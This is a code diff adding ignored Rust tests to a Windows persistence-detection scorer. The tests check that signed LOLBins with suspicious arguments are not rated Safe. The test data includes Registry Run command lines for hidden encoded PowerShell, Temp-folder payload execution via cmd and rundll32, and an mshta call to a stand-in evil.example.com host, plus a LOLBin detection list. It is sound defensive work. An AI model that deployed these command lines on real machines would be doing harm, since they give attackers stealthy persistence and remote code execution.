@@ -978,4 +978,113 @@ mod tests {
             assert!(!info.name.is_empty(), "missing ATT&CK name for {source:?}");
         }
     }
+
+    // -----------------------------------------------------------------------
+    // LOLBin scoring — signed Microsoft hosts with suspicious args currently
+    // score Safe due to the -40 Valid discount. These tests document the
+    // desired future behavior (no discount when LOLBin + heuristic fires)
+    // and are intentionally ignored until the scoring change is approved.
+    // -----------------------------------------------------------------------
+
+    const LOLBINS: &[&str] = &[
+        "powershell.exe",
+        "pwsh.exe",
+        "cmd.exe",
+        "mshta.exe",
+        "rundll32.exe",
+        "wscript.exe",
+        "cscript.exe",
+        "msbuild.exe",
+    ];
+
+    fn is_lolbin(program: &str) -> bool {
+        let lower = program.to_ascii_lowercase();
+        LOLBINS.iter().any(|bin| lower.ends_with(bin))
+    }
+
+    #[test]
+    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
+    fn lolbin_powershell_hidden_encoded_stays_flagged() {
+        let entry = crate::model::PersistenceEntry::new(
+            crate::model::PersistenceSource::RegistryRun,
+            "test",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -EncodedCommand aABlAGwAbABvAA==",
+            "HKCU\\Run",
+        );
+        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
+        // Desired: no -40 when powershell + hidden/encoded triggers
+        assert_ne!(scored.risk, RiskLevel::Safe, "LOLBin powershell with Hidden+Encoded must not be Safe even when signed; got {:?} score {} reasons {:?}", scored.risk, scored.score, scored.reasons);
+        assert!(scored.score >= 15, "should remain at least Suspicious");
+    }
+
+    #[test]
+    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
+    fn lolbin_cmd_with_temp_payload_stays_flagged() {
+        let entry = crate::model::PersistenceEntry::new(
+            crate::model::PersistenceSource::RegistryRun,
+            "test",
+            r"C:\Windows\System32\cmd.exe /c C:\Users\bob\AppData\Local\Temp\payload.exe",
+            "HKCU\\Run",
+        );
+        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
+        assert_ne!(
+            scored.risk,
+            RiskLevel::Safe,
+            "cmd with Temp payload must not be Safe even when signed; got {:?} {:?}",
+            scored.risk,
+            scored.reasons
+        );
+    }
+
+    #[test]
+    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
+    fn lolbin_mshta_with_http_stays_flagged() {
+        // mshta with http is not currently a heuristic, so this test documents
+        // that the minimal fix must either add a heuristic or explicitly list
+        // mshta as LOLBin that never gets discount when URL present.
+        let entry = crate::model::PersistenceEntry::new(
+            crate::model::PersistenceSource::RegistryRun,
+            "test",
+            r"C:\Windows\System32\mshta.exe http://evil.example.com/payload.hta",
+            "HKCU\\Run",
+        );
+        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
+        // Currently Safe (0) because no heuristic fires; desired after fix is investigation.
+        // This test will fail until a mshta+http heuristic or blanket LOLBin rule is added.
+        assert_ne!(
+            scored.risk,
+            RiskLevel::Safe,
+            "mshta with http should not be Safe even when signed; got {:?} {:?}",
+            scored.risk,
+            scored.reasons
+        );
+    }
+
+    #[test]
+    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
+    fn lolbin_rundll32_with_temp_dll_stays_flagged() {
+        let entry = crate::model::PersistenceEntry::new(
+            crate::model::PersistenceSource::RegistryRun,
+            "test",
+            r"C:\Windows\System32\rundll32.exe C:\Users\bob\AppData\Local\Temp\evil.dll,Entry",
+            "HKCU\\Run",
+        );
+        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
+        assert_ne!(
+            scored.risk,
+            RiskLevel::Safe,
+            "rundll32 with Temp DLL must not be Safe even when signed; got {:?} {:?}",
+            scored.risk,
+            scored.reasons
+        );
+    }
+
+    #[test]
+    #[ignore = "pending approval: LOLBin discount helper is pure and case-insensitive"]
+    fn lolbin_helper_is_pure() {
+        assert!(is_lolbin("C:\\Windows\\System32\\powershell.exe"));
+        assert!(is_lolbin("POWERSHELL.EXE"));
+        assert!(is_lolbin("cmd.exe"));
+        assert!(!is_lolbin("notepad.exe"));
+    }
 }
